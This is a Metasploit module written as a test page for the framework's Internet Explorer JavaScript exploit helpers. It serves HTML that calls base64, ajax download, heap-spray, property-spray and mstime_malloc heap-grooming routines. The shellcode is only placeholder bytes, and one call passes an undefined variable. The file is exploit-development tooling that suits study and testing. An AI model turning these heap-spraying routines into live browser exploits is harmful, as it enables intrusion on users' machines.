require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "IE Test for Javascript Libs",
      'Description'    => %q{
        Tests Javascript hotness
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     => [ [ 'URL', 'http://metasploit.com' ] ],
      'Platform'       => 'win',
      'Targets'        => [ [ 'Automatic', {} ] ],
      'Payload'        =>
        {
          'BadChars'        => "\x00",
          'StackAdjustment' => -3500
        },
      'Privileged'     => false,
      'DisclosureDate' => "Apr 1 2013",
      'DefaultTarget'  => 0))
  end

  def test_base64
    %Q|
    #{js_base64}

    var s = "hello, world!!";
    document.write(Base64.encode(s));
    |
  end

  def test_ajax_download
    %Q|
    #{js_ajax_download}

    ajax_download({path:"/test.bin"});
    |
  end

  def test_mstime_malloc
    %Q|
    #{js_mstime_malloc}

    shellcode = unescape("%u4141%u4141%u4141%u4141%u4141");
    offset    = 3;
    s         = 0x58;
    objId     = "myanim";
    mstime_malloc({shellcode:shellcode,offset:offset,heapBlockSize:s,objId:oId});
    |
  end

  def test_property_spray
    %Q|
    #{js_property_spray}

    var s = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
    sprayHeap({shellcode:s});
    |
  end

  def test_heap_spray
    %Q|
    #{js_heap_spray}

    var s = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
    sprayHeap(s, 0x0c0c0c0c, 0x40000);
    |
  end


  def on_request_uri(cli, request)
    # Change the following to a specific function
    js = test_base64


    html = %Q|
    <!doctype html>
    <HTML XMLNS:t ="urn:schemas-microsoft-com:time">
    <head>
    <meta>
      <?IMPORT namespace="t" implementation="#default#time2">
    </meta>
    <script>
      #{js}
    </script>
    </head>
    <body>
    <t:ANIMATECOLOR id="myanim"/>
    </body>
    </html>
    |

    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})
  end

end

